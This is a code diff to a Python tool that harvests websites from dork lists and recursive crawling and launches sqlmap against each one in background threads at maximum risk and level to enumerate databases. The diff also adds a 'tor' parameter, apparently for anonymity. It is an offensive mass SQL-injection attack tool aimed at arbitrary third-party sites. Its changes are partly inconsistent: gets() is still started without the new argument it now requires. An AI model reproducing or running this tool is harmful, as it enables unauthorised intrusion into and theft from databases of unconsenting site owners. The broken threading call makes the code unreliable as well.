@@ -163,19 +163,9 @@ def get_recursive_urls(link, recurive_search):
 
     urls_filtered = [
         i for i in urls if (
-            get_domain_name(i) != get_domain_name(link) and check_ext(i)) and not bool(
-            re.match(
-                r"https*:\/\/[^\/]*\/$",
-                i)) and not bool(
-                    re.match(
-                        r"https*:\/\/[^\/]*$",
-                        i))]
+            get_domain_name(i) != get_domain_name(link) and check_ext(i)) and not bool(re.match(r"https*:\/\/[^\/]*\/$",i)) and not bool(re.match(r"https*:\/\/[^\/]*$",i))]
 
-    print(
-        "extracted %s filtred %s" %
-        (str(
-            len(urls)), str(
-            len(urls_filtered))))
+    print("extracted %s filtred %s" % (str(len(urls)), str(len(urls_filtered))))
     append_sites_on_file(urls_filtered, SITES_FILE, SITES_FILE_LOCK)
 
     for url in urls_filtered:
@@ -522,7 +512,7 @@ def get_number(file_name, lock):
     return len(sites)
 
 
-def exploit(max_threads):
+def exploit(max_threads,tor):
 
     priority_file_number = get_number(PRIORITY_FILE, PRIORITY_FILE_LOCK)
 
@@ -543,10 +533,7 @@ def exploit(max_threads):
     while priority_file_number > 0 or error_file_number > 0:
 
         while get_sqlmap_threads() > max_threads:
-            print(
-                GREEN_FONT +
-                "Waiting for others to finish exploit\n" +
-                END_FONT)
+            print(GREEN_FONT +"Waiting for others to finish exploit\n" +END_FONT)
             time.sleep(100)
 
         else:
@@ -557,8 +544,7 @@ def exploit(max_threads):
             else:
                 site = get_site(ERROR_FILE, ERROR_FILE_LOCK)
 
-            priority_file_number = get_number(
-                PRIORITY_FILE, PRIORITY_FILE_LOCK)
+            priority_file_number = get_number(PRIORITY_FILE, PRIORITY_FILE_LOCK)
 
             error_file_number = get_number(ERROR_FILE, ERROR_FILE_LOCK)
 
@@ -567,12 +553,7 @@ def exploit(max_threads):
             site_file = get_domain_name(site)
             random_int1 = randint(0, 9)
             random_int2 = randint(0, 9)
-            print(
-                GREEN_FONT +
-                "executing exploit for " +
-                site_file +
-                "\n" +
-                END_FONT)
+            print(GREEN_FONT +"executing exploit for " +site_file +"\n" +END_FONT)
             command = ' ( echo "%s" >  working/%s.%s.txt ;  nohup python %ssqlmap.py -u "%s" --batch --risk 3 --level 5 --random-agent --dbs >> working/%s.%s.txt ; mv working/%s.%s.txt finished/%s.%s.txt ) & ' % (site, site_file,
                                                                                                                                                                                                                      str(random_int1) + str(random_int2), SQLMAP_PATH + "/sqlmap/", site, site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2), site_file, str(random_int1) + str(random_int2))
             os.system(command)
@@ -589,11 +570,11 @@ def exploit(max_threads):
         print(GREEN_FONT + "no sites to test" + END_FONT)
 
 
-def all(max_threads, recursive_search_number):
+def all(max_threads, recursive_search_number,tor):
 
     _thread.start_new_thread(gets, ())
     _thread.start_new_thread(test_sites, (SITES_FILE_LOCK,))
-    _thread.start_new_thread(exploit, (max_threads,))
+    _thread.start_new_thread(exploit, (max_threads,tor))
     if recursive_search_number > 0:
         _thread.start_new_thread(recursive_search, (recursive_search_number,))
 
@@ -601,7 +582,7 @@ def all(max_threads, recursive_search_number):
         pass
 
 
-def gets():
+def gets(tor):
     print(BLUE_FONT)
     dorks_number = get_number(DORK_LIST_FILE, DORK_LIST_FILE_LOCK)
     while dorks_number == 0:
@@ -683,7 +664,7 @@ def main():
         threads = int(sys.argv[sys.argv.index("--threads")+1])
     if "--rc" in sys.argv :
         recursive_search = int(sys.argv[sys.argv.index("--rc")+1])
-    all(threads,recursive_search)   
+    all(threads,recursive_search,tor)   
    # if len(sys.argv) == 4 and sys.argv[1] == "get":
    #     get_sites_by_dork(sys.argv[2])
    #     if int(sys.argv[3]) > 0:
